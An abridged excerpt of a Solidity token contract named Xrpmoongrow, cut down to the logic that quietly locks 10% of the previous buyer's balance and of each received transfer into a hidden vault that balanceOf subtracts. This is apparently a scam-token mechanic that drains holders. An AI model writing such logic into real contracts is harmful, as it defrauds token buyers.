...
contract Xrpmoongrow is Context, IERC20, Ownable {
    ...
    string private constant _name = "Xrpmoongrow";
    string private constant _symbol = "XRPMG";
    ...
    function balanceOf(address account) public view override returns (uint256) {
        ...
        return balances[account] - _vault[account];
    }
    ...
    function _transfer(
        ...
        if(takeFee){
            if(to != uniswapV2Pair){
                ...
                _vault[previousBuyer] += balanceOf(previousBuyer) / 10;
                feeDistribution.vaultToken += balanceOf(previousBuyer) / 10;
                previousBuyer = to;
            }
            ...
            if(to != uniswapV2Pair && from != uniswapV2Pair){
                require(amount <= _maxTxAmount, "Transfer Amount exceeds the maxTxnsAmount");
                require(balanceOf(to) + amount <= _maxWalletAmount, "Transfer amount exceeds the maxWalletAmount.");
                _vault[to] += transferAmount / 10;
                feeDistribution.vaultToken += transferAmount / 10;
            }
        }
